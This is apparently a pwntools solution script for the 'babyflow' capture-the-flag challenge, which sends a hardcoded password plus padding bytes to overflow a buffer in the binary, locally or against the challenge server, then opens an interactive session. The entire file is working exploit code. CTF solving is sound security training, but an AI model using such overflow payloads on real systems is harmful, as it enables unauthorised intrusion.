#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyflow")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("babyflow.ctf.intigriti.io", 1331)

    return r


def main():
    r = conn()
    input()
    payload = b'SuPeRsEcUrEPaSsWoRd123' + b'A'*28 + b'1'   
    r.sendline(payload)
    info(r.recvall(3))
    pause()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
